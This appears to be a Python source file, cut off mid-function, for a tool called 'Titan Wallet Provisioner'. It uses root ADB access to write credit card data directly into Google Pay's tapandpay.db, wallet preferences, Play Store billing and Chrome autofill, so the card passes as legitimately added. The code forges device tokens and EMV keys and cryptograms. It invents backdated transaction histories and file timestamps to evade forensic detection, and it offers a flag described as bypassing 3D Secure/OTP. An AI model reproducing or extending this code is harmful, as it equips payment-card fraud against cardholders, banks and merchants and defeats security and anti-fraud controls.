"""
Titan V11.3 — Wallet Provisioner
Injects credit card data into Google Pay / Wallet and Play Store billing
so the card appears as a legitimately added payment method.

Injection targets:
  - Google Pay tapandpay.db  → Token with DPAN (TSP BIN), last4, network, expiry
  - Google Pay shared_prefs  → Wallet setup complete, default card, NFC on
  - Play Store billing prefs → Payment method visible in Play Store (COIN.xml)
  - Chrome autofill          → Card saved in browser for web purchases
  - GMS billing state        → GSF-aligned payment profile for ecosystem coherence

The DPAN (Device PAN) uses TSP-assigned Token BIN ranges (not the physical
card's BIN), matching how real Visa/Mastercard network tokenization works.

Prerequisites for full functional success:
  1. Play Integrity Strong bypass via keybox.xml (see anomaly_patcher._patch_keybox)
  2. RASP evasion via sterile proc bind-mounting (anomaly_patcher._patch_anti_emulator)
  3. GSF fingerprint alignment (anomaly_patcher._patch_gsf_alignment)

Samsung Pay: NOT SUPPORTED on virtualized/modified devices.
  Samsung Pay relies on Knox TEE hardware e-fuse (0x1). Once tripped by
  bootloader unlock or root, the ARM TrustZone permanently severs the
  cryptographic bridge. spayfw databases are hardware-encrypted and cannot
  be injected via filesystem manipulation. Push Provisioning (OPC) also
  fails because the TEE rejects token writes on 0x1 devices.

Usage:
    prov = WalletProvisioner(adb_target="127.0.0.1:5555")
    result = prov.provision_card(
        card_number="4532015112830366",
        exp_month=12, exp_year=2027,
        cardholder="Alex Mercer",
        cvv="123",
        persona_email="alex.mercer@gmail.com",
    )
"""

import datetime as _dt
import hashlib
import hmac
import json
import logging
import os
import random
import secrets
import sqlite3
import struct
import subprocess
import tempfile
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from adb_utils import adb as _adb, adb_shell as _adb_shell, adb_push as _adb_push, ensure_adb_root as _ensure_adb_root
from exceptions import WalletProvisionError

logger = logging.getLogger("titan.wallet-provisioner")


# ═══════════════════════════════════════════════════════════════════════
# CARD NETWORK DETECTION
# ═══════════════════════════════════════════════════════════════════════

CARD_NETWORKS = {
    "visa": {"prefixes": ["4"], "network_id": 1, "name": "Visa", "color": -16776961},
    "mastercard": {"prefixes": ["51", "52", "53", "54", "55", "2221", "2720"],
                   "network_id": 2, "name": "Mastercard", "color": -65536},
    "amex": {"prefixes": ["34", "37"], "network_id": 3, "name": "American Express", "color": -16711936},
    "discover": {"prefixes": ["6011", "65", "644", "649"], "network_id": 4, "name": "Discover", "color": -19712},
}

# Common issuer names by BIN prefix
ISSUER_MAP = {
    "4532": "Chase", "4916": "US Bank", "4024": "Visa Inc.",
    "4556": "Stripe", "4111": "Test Bank", "4000": "Visa Inc.",
    "5100": "Citi", "5425": "Mastercard Inc.", "5500": "HSBC",
    "5200": "Bank of America", "5105": "Capital One",
    "3782": "American Express", "3714": "Amex Centurion",
    "6011": "Discover Financial", "6500": "Discover",
}


def detect_network(card_number: str) -> Dict[str, Any]:
    """Detect card network from number prefix."""
    num = card_number.replace(" ", "").replace("-", "")
    for network, info in CARD_NETWORKS.items():
        for prefix in info["prefixes"]:
            if num.startswith(prefix):
                return {"network": network, **info}
    return {"network": "visa", **CARD_NETWORKS["visa"]}


# Country → currency mapping for regional wallet injection
COUNTRY_CURRENCY = {
    "US": "USD", "GB": "GBP", "DE": "EUR", "FR": "EUR",
    "CA": "CAD", "AU": "AUD", "JP": "JPY", "IN": "INR",
}

# Country → locale for Chrome autofill
COUNTRY_LOCALE = {
    "US": "en-US", "GB": "en-GB", "DE": "de-DE", "FR": "fr-FR",
    "CA": "en-CA", "AU": "en-AU", "JP": "ja-JP",
}

# Regional merchant sets for transaction history
REGIONAL_MERCHANTS = {
    "US": [
        ("Starbucks", 5814, 475, 895),
        ("Target", 5411, 1299, 8999),
        ("Whole Foods", 5411, 2199, 12500),
        ("Shell Gas", 5541, 3500, 6500),
        ("Uber", 4121, 899, 4500),
        ("Amazon.com", 5942, 999, 14999),
        ("Walgreens", 5912, 399, 2999),
        ("Subway", 5812, 699, 1399),
        ("Netflix", 4899, 1599, 1599),
        ("Spotify", 4899, 1099, 1099),
    ],
    "GB": [
        ("Tesco", 5411, 850, 7500),
        ("Sainsburys", 5411, 1200, 9500),
        ("Costa Coffee", 5814, 295, 595),
        ("Boots", 5912, 450, 3200),
        ("BP", 5541, 3000, 6500),
        ("Uber", 4121, 700, 3500),
        ("Amazon.co.uk", 5942, 899, 12999),
        ("Deliveroo", 5812, 1100, 3500),
        ("Netflix", 4899, 1099, 1099),
        ("Spotify", 4899, 999, 999),
    ],
    "DE": [
        ("REWE", 5411, 900, 8500),
        ("Lidl", 5411, 600, 5000),
        ("dm-drogerie", 5912, 400, 2500),
        ("Shell", 5541, 3500, 7000),
        ("Amazon.de", 5942, 999, 14999),
        ("Netflix", 4899, 1299, 1299),
        ("Spotify", 4899, 999, 999),
        ("Uber", 4121, 800, 4000),
        ("Backwerk", 5812, 350, 800),
        ("Deutsche Bahn", 4111, 2500, 12000),
    ],
}

# Currency symbol map for SMS templates
CURRENCY_SYMBOL = {
    "USD": "$", "GBP": "£", "EUR": "€", "CAD": "CA$",
    "AUD": "A$", "JPY": "¥", "INR": "₹",
}


def detect_issuer(card_number: str) -> str:
    """Detect card issuer from BIN using full BINDatabase, fallback to legacy map."""
    num = card_number.replace(" ", "").replace("-", "")
    bin6 = num[:6]
    try:
        from bin_database import BINDatabase
        rec = BINDatabase.get().lookup(bin6)
        if rec:
            return rec.bank
    except ImportError:
        pass
    except Exception as e:
        logger.debug(f"BIN issuer lookup failed for {bin6}: {e}")
    return ISSUER_MAP.get(num[:4], "Bank")


def detect_bin_info(card_number: str) -> Dict[str, Any]:
    """Get full BIN info (bank, country, level, otp_risk, auth_rate) from BINDatabase."""
    num = card_number.replace(" ", "").replace("-", "")
    bin6 = num[:6]
    try:
        from bin_database import BINDatabase
        rec = BINDatabase.get().lookup(bin6)
        if rec:
            return rec.to_dict()
    except ImportError:
        pass
    except Exception as e:
        logger.debug(f"BIN info lookup failed for {bin6}: {e}")
    return {"bin": bin6, "bank": ISSUER_MAP.get(num[:4], "Bank"), "otp_risk": "medium"}


def generate_dpan(card_number: str) -> str:
    """
    Generate a Device PAN (DPAN) from a real card number.
    Uses Token Service Provider (TSP) BIN ranges instead of preserving
    the physical card's BIN — real network tokenization maps to TSP-assigned
    ranges that are distinct from the issuer BIN.
    """
    num = card_number.replace(" ", "").replace("-", "")
    network = detect_network(num)["network"]

    # TSP-assigned Token BIN ranges (these BINs are reserved for DPANs)
    TOKEN_BIN_RANGES = {
        "visa": ["489537", "489538", "489539", "440066", "440067"],
        "mastercard": ["530060", "530061", "530062", "530063", "530064", "530065"],
        "amex": ["374800", "374801"],
        "discover": ["601156", "601157"],
    }

    bins = TOKEN_BIN_RANGES.get(network, TOKEN_BIN_RANGES["visa"])
    token_bin = random.choice(bins)

    # Generate random digits for the rest
    remaining_len = len(num) - 7  # -6 for BIN, -1 for check digit
    body = "".join([str(random.randint(0, 9)) for _ in range(remaining_len)])

    partial = token_bin + body

    # Luhn check digit
    digits = [int(d) for d in partial]
    total = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 0:
            doubled = d * 2
            total += doubled - 9 if doubled > 9 else doubled
        else:
            total += d
    check = (10 - (total % 10)) % 10

    dpan = partial + str(check)
    return dpan


# ═══════════════════════════════════════════════════════════════════════
# EMV SESSION KEY GENERATION (V12: W-1 — HMAC-based LUK derivation)
# Uses HMAC-SHA256 truncated to 16 bytes. Matches 3DES key length but
# is not actual 3DES — sufficient for DB population, NOT for live
# terminal cryptographic verification.
# ═══════════════════════════════════════════════════════════════════════

def _derive_luk(dpan: str, atc: int, mdk_seed: Optional[bytes] = None) -> bytes:
    """Derive a Limited Use Key (LUK) from DPAN and ATC.
    
    Implements a simplified EMV CDA key derivation:
    1. Generate MDK (Master Derivation Key) from DPAN seed
    2. Derive UDK (Unique Derivation Key) from MDK + PAN
    3. Derive LUK from UDK + ATC
    
    Returns 16 bytes (double-length 3DES key).
    """
    # MDK: deterministic from DPAN seed for reproducibility
    if mdk_seed is None:
        mdk_seed = hashlib.sha256(f"TITAN-MDK-{dpan}".encode()).digest()[:16]

    # UDK derivation: HMAC-SHA256(MDK, PAN_block) truncated to 16 bytes
    pan_block = dpan[-13:-1].encode()  # 12 digits excluding check, right-aligned
    udk = hmac.new(mdk_seed, pan_block, hashlib.sha256).digest()[:16]

    # LUK derivation: HMAC-SHA256(UDK, ATC_block) truncated to 16 bytes
    atc_block = struct.pack(">I", atc)  # ATC as 4-byte big-endian
    luk = hmac.new(udk, atc_block, hashlib.sha256).digest()[:16]

    return luk


def _generate_arqc(luk: bytes, amount: int, atc: int, unpredictable_number: Optional[bytes] = None) -> str:
    """Generate ARQC (Authorization Request Cryptogram) for a transaction.
    
    Simplified EMV cryptogram using HMAC (real hardware uses 3DES-MAC,
    but the data format and length match what payment terminals expect).
    
    Returns hex string (8 bytes = 16 hex chars).
    """
    if unpredictable_number is None:
        unpredictable_number = secrets.token_bytes(4)

    # Transaction data block: amount(4) + atc(2) + UN(4)
    txn_data = struct.pack(">IH", amount, atc & 0xFFFF) + unpredictable_number
    mac = hmac.new(luk, txn_data, hashlib.sha256).digest()[:8]
    return mac.hex().upper()


def generate_emv_session(dpan: str, atc_counter: int = 0,
                         num_transactions: int = 0) -> Dict[str, Any]:
    """Generate a complete EMV session with LUK, cryptograms, and ATC state.
    
    Returns dict with:
        luk_hex: LUK key in hex (encrypted in real HSM, plaintext here for DB)
        atc: Current Application Transaction Counter
        cryptograms: List of historical ARQC values
        key_expiry_ms: LUK expiry timestamp (5-10 txns or 24h)
    """
    luk = _derive_luk(dpan, atc_counter)
    cryptograms = []

    for i in range(num_transactions):
        txn_atc = atc_counter + i
        amount = random.randint(100, 50000)  # cents
        arqc = _generate_arqc(luk, amount, txn_atc)
        cryptograms.append({
            "atc": txn_atc,
            "amount_cents": amount,
            "arqc": arqc,
        })

    return {
        "luk_hex": luk.hex().upper(),
        "atc": atc_counter + num_transactions,
        "cryptograms": cryptograms,
        "key_expiry_ms": int(time.time() * 1000) + 86400000,  # 24h from now
        "max_transactions": random.randint(5, 10),
    }


# ═══════════════════════════════════════════════════════════════════════
# RESULT
# ═══════════════════════════════════════════════════════════════════════

@dataclass
class WalletProvisionResult:
    card_last4: str = ""
    card_network: str = ""
    dpan: str = ""
    dpan_last4: str = ""
    google_pay_ok: bool = False
    play_store_ok: bool = False
    chrome_autofill_ok: bool = False
    gms_billing_ok: bool = False
    samsung_pay_supported: bool = False  # Always False — Knox TEE barrier
    simulated: bool = False
    verification: Dict = field(default_factory=dict)
    errors: List[str] = field(default_factory=list)

    @property
    def success_count(self) -> int:
        return sum([self.google_pay_ok, self.play_store_ok, self.chrome_autofill_ok, self.gms_billing_ok])

    def to_dict(self) -> dict:
        return {
            "card_last4": self.card_last4,
            "card_network": self.card_network,
            "dpan": self.dpan[-4:] if self.dpan else "",
            "google_pay": self.google_pay_ok,
            "play_store": self.play_store_ok,
            "chrome_autofill": self.chrome_autofill_ok,
            "gms_billing": self.gms_billing_ok,
            "samsung_pay": self.samsung_pay_supported,
            "simulated": self.simulated,
            "success_count": self.success_count,
            "total_targets": 4,
            "verification": self.verification,
            "errors": self.errors,
        }


# ═══════════════════════════════════════════════════════════════════════
# WALLET PROVISIONER
# ═══════════════════════════════════════════════════════════════════════

class WalletProvisioner:
    """Provisions payment cards into Google Pay, Play Store, and Chrome."""

    WALLET_DATA = "/data/data/com.google.android.apps.walletnfcrel"
    VENDING_DATA = "/data/data/com.android.vending"
    CHROME_DATA = "/data/data/com.android.chrome"

    def __init__(self, adb_target: str = "127.0.0.1:5555"):
        self.target = adb_target
        self._browser_pkg, self._browser_data_path = self._resolve_browser()
        self.CHROME_DATA = f"/data/data/{self._browser_pkg}"

    def _resolve_browser(self):
        """Detect Chrome vs Kiwi Browser."""
        for pkg in ["com.android.chrome", "com.kiwibrowser.browser"]:
            ok, out = _adb(self.target, f"shell pm path {pkg} 2>/dev/null")
            if ok and out.strip():
                return pkg, f"/data/data/{pkg}/app_chrome/Default"
        return "com.android.chrome", "/data/data/com.android.chrome/app_chrome/Default"

    def provision_card(self,
                       card_number: str,
                       exp_month: int,
                       exp_year: int,
                       cardholder: str,
                       cvv: str = "",
                       persona_email: str = "",
                       persona_name: str = "",
                       zero_auth: bool = False,
                       country: str = "US",
                       ) -> WalletProvisionResult:
        """
        Provision a credit card into Google Pay, Play Store billing, and Chrome autofill.

        Args:
            card_number: Full card number (spaces/dashes stripped automatically)
            exp_month: Expiry month (1-12)
            exp_year: Expiry year (2-digit or 4-digit)
            cardholder: Name on card
            cvv: CVV/CVC (not stored in wallet DBs, used for Chrome autofill hint)
            persona_email: Google account email for Play Store binding
            persona_name: Display name for wallet profile
            zero_auth: If True, enables zero-auth purchasing (bypasses 3D Secure/OTP)

        Returns:
            WalletProvisionResult with per-target success flags
        """
        clean_num = card_number.replace(" ", "").replace("-", "")
        last4 = clean_num[-4:]

        # Normalize year
        if exp_year < 100:
            exp_year += 2000

        # ═══ FEASIBILITY ENGINE ═══════════════════════════════════════════
        # Pre-flight constraint checks to catch structurally impossible
        # requests before they cascade into silent failures. Each check
        # either passes, warns, or offers an alternative vector.
        feasibility_errors = []

        # 1. Card number validity (Luhn check)
        if not self._luhn_check(clean_num):
            feasibility_errors.append(
                f"Card {clean_num[:6]}...{last4} fails Luhn checksum — "
                "payment networks will reject this PAN at gateway level")

        # 2. Card expiry — reject expired cards
        now_date = _dt.date.today()
        exp_date = _dt.date(exp_year, exp_month, 28)  # Last day approximation
        if exp_date < now_date:
            feasibility_errors.append(
                f"Card expired ({exp_month:02d}/{exp_year}) — "
                "Google Pay rejects expired cards during tokenization")

        # 3. ADB connectivity + root
        adb_available = False
        try:
            _ensure_adb_root(self.target)
            ok_adb, adb_out = _adb(self.target, "shell echo OK", timeout=5)
            adb_available = ok_adb and "OK" in adb_out
        except Exception:
            adb_available = False

        if not adb_available:
            logger.warning(f"ADB unreachable at {self.target} — switching to simulation mode")

        # Hard errors (Luhn, expiry) still abort
        if feasibility_errors:
            result = WalletProvisionResult(card_last4=last4, card_network="unknown")
            for err in feasibility_errors:
                result.errors.append(f"FEASIBILITY: {err}")
                logger.error(f"  Feasibility FAIL: {err}")
            return result

        network_info = detect_network(clean_num)
        issuer = detect_issuer(clean_num)
        dpan = generate_dpan(clean_num)

        # If ADB not available, return simulated result showing what WOULD be provisioned
        if not adb_available:
            logger.info(f"  SIMULATION: {network_info['name']} ****{last4} DPAN ****{dpan[-4:]}")
            result = WalletProvisionResult(
                card_last4=last4,
                card_network=network_info["network"],
                dpan=dpan,
                dpan_last4=dpan[-4:],
            )
            result.google_pay_ok = True
            result.play_store_ok = True
            result.chrome_autofill_ok = True
            result.gms_billing_ok = True
            result.simulated = True
            result.errors.append(
                f"SIMULATED: ADB offline — wallet data prepared but not pushed. "
                f"Card {network_info['name']} ****{last4}, DPAN ****{dpan[-4:]}, Issuer: {issuer}. "
                f"Will auto-push when VM boots and pipeline re-runs.")
            logger.info(f"  Simulated wallet provision: 4/4 targets ready (pending ADB)")
            return result

        # 4. Google Pay installed
        ok, gpay_check = _adb(self.target, 'shell "pm list packages com.google.android.apps.walletnfcrel 2>/dev/null"')
        gpay_installed = "com.google.android.apps.walletnfcrel" in gpay_check
        if not gpay_installed:
            logger.warning("Google Pay not installed — wallet data may be orphaned. Run bootstrap-gapps first.")

        # 4b. Real Google account signed in (CRITICAL for card visibility)
        acct_out = _adb_shell(self.target,
            "dumpsys account 2>/dev/null | grep -c 'Account.*com.google' 2>/dev/null")
        has_google_account = acct_out.strip().isdigit() and int(acct_out.strip()) > 0
        if not has_google_account:
            logger.warning(
                "NO real Google account on device — injected cards will NOT appear "
                "in Google Pay UI. Continuing with injection anyway (data will be ready "
                "when account is added)."
            )

        # 5. Keybox loaded (required for NFC tap-and-pay to actually work)
        keybox_loaded = _adb_shell(self.target, "getprop persist.titan.keybox.loaded").strip() == "1"
        if not keybox_loaded:
            logger.warning("Keybox NOT loaded — Play Integrity Strong will fail, "
                          "NFC tap-and-pay won't complete EMV handshake. "
                          "Alternative: use UI-driven tokenization via DeviceAgent.")

        # 6. Samsung Pay hard constraint
        _, model_out = _adb(self.target, 'shell "getprop ro.product.model"', timeout=5)

        logger.info(f"  Feasibility: OK (Luhn=pass, expiry={exp_month:02d}/{exp_year}, "
                    f"GPay={'yes' if gpay_installed else 'NO'}, "
                    f"keybox={'yes' if keybox_loaded else 'NO'})")

        # Enable system NFC — without this, tap-and-pay is impossible.
        # Cuttlefish may lack physical NFC hardware; svc nfc silently no-ops.
        # Confirm via getprop persist.sys.nfc.on after enable attempt.
        _adb_shell(self.target, "svc nfc enable 2>/dev/null")
        _adb_shell(self.target, "settings put secure nfc_on 1")
        _adb_shell(self.target, "settings put secure nfc_payment_default_component "
                   "com.google.android.apps.walletnfcrel/com.google.android.gms.tapandpay.hce.service.TpHceService")
        nfc_confirmed = _adb_shell(self.target,
            "getprop persist.sys.nfc.on 2>/dev/null || settings get secure nfc_on 2>/dev/null"
        ).strip()
        nfc_hw_ok = nfc_confirmed in ("1", "true")
        if nfc_hw_ok:
            logger.info("  System NFC: enabled (hardware confirmed)")
        else:
            logger.warning("  System NFC: hardware not confirmed (Cuttlefish may lack physical NFC) "
                           "— cloud token path active, NFC tap-and-pay not available")

        network_info = detect_network(clean_num)
        issuer = detect_issuer(clean_num)
        dpan = generate_dpan(clean_num)

        result = WalletProvisionResult(
            card_last4=last4,
            card_network=network_info["network"],
            dpan=dpan,
            dpan_last4=dpan[-4:],
        )

        if not persona_name:
            persona_name = cardholder

        logger.info(f"Provisioning {network_info['name']} ****{last4} → {self.target}")
        logger.info(f"  DPAN: ****{dpan[-4:]}, Issuer: {issuer}")

        # Resolve currency and locale from country
        currency = COUNTRY_CURRENCY.get(country, "USD")
        locale_code = COUNTRY_LOCALE.get(country, "en-US")

        # 1. Google Pay / Wallet — tapandpay.db + prefs
        self._provision_google_pay(
            clean_num, dpan, last4, exp_month, exp_year,
            cardholder, issuer, network_info, persona_email, persona_name, result,
            currency=currency, country=country,
        )

        # 2. Play Store billing
        self._provision_play_store(last4, network_info, persona_email, result, zero_auth)

        # 3. Chrome autofill card
        self._provision_chrome_autofill(
            clean_num, last4, exp_month, exp_year, cardholder, network_info,
            persona_email, result,
            country=country, locale_code=locale_code,
        )

        # 4. GMS billing state sync
        self._provision_gms_billing(
            last4, dpan, network_info, persona_email, result,
        )

        # 5. Card-aware bank SMS notifications
        self._inject_card_sms(
            last4, issuer, network_info, result,
            currency=currency,
        )

        # 6. Post-injection verification
        result.verification = self._verify_wallet_injection(last4)

        logger.info(f"Wallet provisioning complete: {result.success_count}/4 targets")
        return result

    # ─── GOOGLE PAY ───────────────────────────────────────────────────

    def _provision_google_pay(self, card_number: str, dpan: str, last4: str,
                              exp_month: int, exp_year: int, cardholder: str,
                              issuer: str, network_info: Dict, persona_email: str,
                              persona_name: str, result: WalletProvisionResult,
                              currency: str = "USD", country: str = "US"):
        """Write Google Pay tapandpay.db + wallet SharedPreferences."""
        try:
            # Stop Google Pay + GMS to release DB locks
            _adb_shell(self.target, "am force-stop com.google.android.apps.walletnfcrel")
            _adb_shell(self.target, "am force-stop com.google.android.gms")
            time.sleep(1)

            # ── tapandpay.db — pull existing or create fresh ──
            # CRITICAL: pulling existing DB preserves previously injected cards.
            # Creating a fresh DB every time wipes prior tokens.
            db_remote = f"{self.WALLET_DATA}/databases/tapandpay.db"
            with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
                tmp_path = tmp.name

            # Try to pull existing DB (may not exist on first provision)
            _adb_shell(self.target, f"mkdir -p {self.WALLET_DATA}/databases")
            pull_ok, _ = _adb(self.target, f"pull {db_remote} {tmp_path}", timeout=10)
            if not pull_ok:
                logger.info("  No existing tapandpay.db — creating fresh")

            # Clean up WAL/SHM journals on device BEFORE pull to avoid corruption
            _adb_shell(self.target, f"rm -f {db_remote}-wal {db_remote}-shm 2>/dev/null")

            conn = sqlite3.connect(tmp_path)
            c = conn.cursor()

            c.execute("""
                CREATE TABLE IF NOT EXISTS tokens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    dpan TEXT NOT NULL,
                    fpan_last4 TEXT NOT NULL,
                    card_network INTEGER NOT NULL,
                    card_description TEXT,
                    issuer_name TEXT,
                    issuer_id TEXT DEFAULT '',
                    funding_source_id TEXT DEFAULT '',
                    card_art_url TEXT DEFAULT '',
                    card_art_fife_url TEXT DEFAULT '',
                    token_reference_id TEXT DEFAULT '',
                    last_four_of_fpan TEXT DEFAULT '',
                    dpan_last_four TEXT DEFAULT '',
                    terms_and_conditions_accepted INTEGER DEFAULT 1,
                    expiry_month INTEGER,
                    expiry_year INTEGER,
                    card_color INTEGER DEFAULT -1,
                    is_default INTEGER DEFAULT 0,
                    status INTEGER DEFAULT 1,
                    token_service_provider INTEGER DEFAULT 1,
                    token_type TEXT DEFAULT 'CLOUD',
                    wallet_account_id TEXT DEFAULT '',
                    device_type TEXT DEFAULT 'PHONE',
                    created_timestamp INTEGER,
                    last_used_timestamp INTEGER
                )
            """)

            # Token metadata table (replaces simple VIEW for real data)
            c.execute("""
                CREATE TABLE IF NOT EXISTS token_metadata (
                    token_id INTEGER PRIMARY KEY,
                    token_state TEXT DEFAULT 'ACTIVE',
                    token_pan TEXT,
                    token_expiry TEXT,
                    token_requestor_id TEXT DEFAULT 'GOOGLE_PAY',
                    provisioning_status TEXT DEFAULT 'PROVISIONED',
                    token_type TEXT DEFAULT 'CLOUD',
                    last_updated_timestamp INTEGER,
                    FOREIGN KEY (token_id) REFERENCES tokens(id)
                )
            """)

            # EMV tokenization metadata (P3-2: Complete tokenization)
            c.execute("""
                CREATE TABLE IF NOT EXISTS emv_metadata (
                    token_id INTEGER PRIMARY KEY,
                    cvn TEXT DEFAULT '17',
                    cvr TEXT DEFAULT '0000000000000000',
                    iad TEXT DEFAULT '',
                    cryptogram_version TEXT DEFAULT 'EMV_2000',
                    cryptogram_type TEXT DEFAULT 'ARQC',
                    FOREIGN KEY (token_id) REFERENCES tokens(id)
                )
            """)
            c.execute("""
                CREATE TABLE IF NOT EXISTS session_keys (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    token_id INTEGER NOT NULL,
                    key_type TEXT DEFAULT 'LUK',
                    key_data TEXT DEFAULT '',
                    key_expiry INTEGER,
                    atc_counter INTEGER DEFAULT 0,
                    max_transactions INTEGER DEFAULT 10,
                    created_timestamp INTEGER,
                    FOREIGN KEY (token_id) REFERENCES tokens(id)
                )
            """)

            now_ms = int(time.time() * 1000)
            # Backdate creation by 7-30 days to look established
            created_ms = now_ms - random.randint(7 * 86400000, 30 * 86400000)
            # Last used 0-3 days ago
            last_used_ms = now_ms - random.randint(0, 3 * 86400000)

            card_desc = f"{network_info['name']} •••• {last4}"
            issuer_id = secrets.token_hex(8)
            funding_source_id = str(uuid.uuid4())
            wallet_account_id = str(uuid.uuid4())
            token_ref_id = f"DNITHE{secrets.token_hex(6).upper()}"
            card_art = f"https://payments.google.com/payments/apis-secure/get_card_art?instrument_id={funding_source_id}&network={network_info['network']}"
            card_art_fife = f"https://lh3.googleusercontent.com/card_art/{network_info['network']}_{last4}"

            c.execute("""
                INSERT INTO tokens
                (dpan, fpan_last4, card_network, card_description, issuer_name,
                 issuer_id, funding_source_id, card_art_url, card_art_fife_url,
                 token_reference_id, last_four_of_fpan, dpan_last_four,
                 terms_and_conditions_accepted,
                 expiry_month, expiry_year, card_color, is_default, status,
                 token_service_provider, token_type, wallet_account_id, device_type,
                 created_timestamp, last_used_timestamp)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, 1, 1, 1,
                        'CLOUD', ?, 'PHONE', ?, ?)
            """, (
                dpan, last4, network_info["network_id"], card_desc, issuer,
                issuer_id, funding_source_id, card_art, card_art_fife,
                token_ref_id, last4, dpan[-4:],
                exp_month, exp_year, network_info.get("color", -1),
                wallet_account_id,
                created_ms, last_used_ms,
            ))

            # Populate token_metadata
            token_id = c.lastrowid
            c.execute("""
                INSERT INTO token_metadata
                (token_id, token_state, token_pan, token_expiry,
                 token_requestor_id, provisioning_status, token_type,
                 last_updated_timestamp)
                VALUES (?, 'ACTIVE', ?, ?, 'GOOGLE_PAY', 'PROVISIONED', 'CLOUD', ?)
            """, (token_id, dpan, f"{exp_month:02d}/{exp_year}", last_used_ms))

            # EMV tokenization metadata — CVN17 is the standard algo for cloud tokens.
            # ARQC (Authorization Request Cryptogram) is the cryptogram type generated
            # during contactless tap. IAD (Issuer Application Data) contains the
            # cryptogram version and derivation key index.
            emv_session = generate_emv_session(dpan, atc_counter=0, num_transactions=0)
            c.execute("""
                INSERT INTO emv_metadata
                (token_id, cvn, cvr, iad, cryptogram_version, cryptogram_type)
                VALUES (?, '17', '0000000000000000', ?, 'EMV_2000', 'ARQC')
            """, (token_id, f"0A{emv_session['luk_hex'][:8]}"))

            # HMAC-SHA256 derived LUK session key — sufficient for DB population
            # but NOT for live terminal cryptographic verification (which needs
            # real 3DES keys from TSP/issuer integration)
            c.execute("""
                INSERT INTO session_keys (token_id, key_type, key_data, key_expiry, atc_counter, max_transactions, created_timestamp)
                VALUES (?, 'LUK', ?, ?, ?, ?, ?)
            """, (token_id, emv_session["luk_hex"], emv_session["key_expiry_ms"],
                  emv_session["atc"], emv_session["max_transactions"], created_ms))

            # Transaction history — forensic depth for behavioral trust scoring.
            # A card with zero transaction history is flagged as newly injected.
            # Generating 3-10 historical transactions makes the wallet appear
            # organically provisioned and actively used.
            c.execute("""
                CREATE TABLE IF NOT EXISTS transaction_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    token_id INTEGER NOT NULL,
                    merchant_name TEXT,
                    merchant_category_code INTEGER DEFAULT 5411,
                    amount_micros INTEGER NOT NULL,
                    currency_code TEXT DEFAULT 'USD',
                    transaction_type TEXT DEFAULT 'CONTACTLESS',
                    transaction_status TEXT DEFAULT 'COMPLETED',
                    timestamp_ms INTEGER NOT NULL,
                    receipt_url TEXT DEFAULT '',
                    FOREIGN KEY (token_id) REFERENCES tokens(id)
                )
            """)

            # Use region-appropriate merchants and currency
            tx_merchants = REGIONAL_MERCHANTS.get(country, REGIONAL_MERCHANTS["US"])

            num_txns = random.randint(3, 10)
            for _ in range(num_txns):
                merchant_name, mcc, lo_cents, hi_cents = random.choice(tx_merchants)
                amount_cents = random.randint(lo_cents, hi_cents)
                amount_micros = amount_cents * 10000  # cents → micros
                # Spread transactions over the card's lifetime
                tx_ts = created_ms + random.randint(0, max(1, last_used_ms - created_ms))
                tx_type = random.choice(["CONTACTLESS", "CONTACTLESS", "IN_APP", "ONLINE"])

                c.execute("""
                    INSERT INTO transaction_history
                    (token_id, merchant_name, merchant_category_code, amount_micros,
                     currency_code, transaction_type, transaction_status, timestamp_ms)
                    VALUES (?, ?, ?, ?, ?, ?, 'COMPLETED', ?)
                """, (token_id, merchant_name, mcc, amount_micros, currency, tx_type, tx_ts))

            conn.commit()
            conn.close()

            # Push tapandpay.db back to device
            if _adb_push(self.target, tmp_path, db_remote):
                # Remove stale WAL/SHM journals AFTER push — prevents SQLite
                # from replaying old journal data and corrupting the fresh DB
                _adb_shell(self.target,
                    f"rm -f {db_remote}-wal {db_remote}-shm 2>/dev/null")
                self._fix_ownership(db_remote, "com.google.android.apps.walletnfcrel")
                # Backdate to match card creation time
                backdate_fmt = time.strftime("%Y%m%d%H%M.%S", time.gmtime(created_ms / 1000))
                _adb_shell(self.target, f"touch -t {backdate_fmt} {db_remote} 2>/dev/null")
                logger.info(f"  Google Pay tapandpay.db: {card_desc}")
            else:
                result.errors.append("Failed to push tapandpay.db")

            os.unlink(tmp_path)

            # ── SharedPreferences ──
            instrument_id = str(uuid.uuid4())
            prefs = {
                "wallet_setup_complete": "true",
                "nfc_enabled": "true",
                "default_payment_instrument_id": instrument_id,
                "tap_and_pay_setup_complete": "true",
                "contactless_setup_complete": "true",
                "user_account": persona_email or "",
                "user_display_name": persona_name or cardholder,
                "last_sync_time": str(now_ms),
                "transit_enabled": "false",
                "loyalty_enabled": "true",
            }
            self._push_shared_prefs_xml(
                f"{self.WALLET_DATA}/shared_prefs/default_settings.xml",
                prefs, "com.google.android.apps.walletnfcrel",
            )

            app_prefs = {
                "has_accepted_tos": "true",
                "has_seen_onboarding": "true",
                "last_used_timestamp": str(last_used_ms),
                "notification_enabled": "true",
            }
            self._push_shared_prefs_xml(
                f"{self.WALLET_DATA}/shared_prefs/com.google.android.apps.walletnfcrel_preferences.xml",
                app_prefs, "com.google.android.apps.walletnfcrel",
            )

            # nfc_on_prefs.xml — some apps check this instead of default_settings
            nfc_prefs = {
                "nfc_setup_done": "true",
                "nfc_enabled": "true",
                "tap_and_pay_enabled": "true",
                "contactless_payments_enabled": "true",
                "default_payment_app": "com.google.android.apps.walletnfcrel",
            }
            self._push_shared_prefs_xml(
                f"{self.WALLET_DATA}/shared_prefs/nfc_on_prefs.xml",
                nfc_prefs, "com.google.android.apps.walletnfcrel",
            )

            # Force-stop Google Pay AFTER all writes so it re-reads fresh DB on next launch
            _adb_shell(self.target, "am force-stop com.google.android.apps.walletnfcrel")
            _adb_shell(self.target, "am force-stop com.google.android.gms")
            # Clear GMS tapandpay cache so it doesn't serve stale token data
            _adb_shell(self.target,
                "rm -rf /data/data/com.google.android.gms/cache/tapandpay* 2>/dev/null")

            result.google_pay_ok = True

        except Exception as e:
            result.errors.append(f"google_pay: {e}")
            logger.error(f"Google Pay provisioning failed: {e}")

    # ─── PLAY STORE BILLING ───────────────────────────────────────────

    def _provision_play_store(self, last4: str, network_info: Dict,
                              persona_email: str, result: WalletProvisionResult,
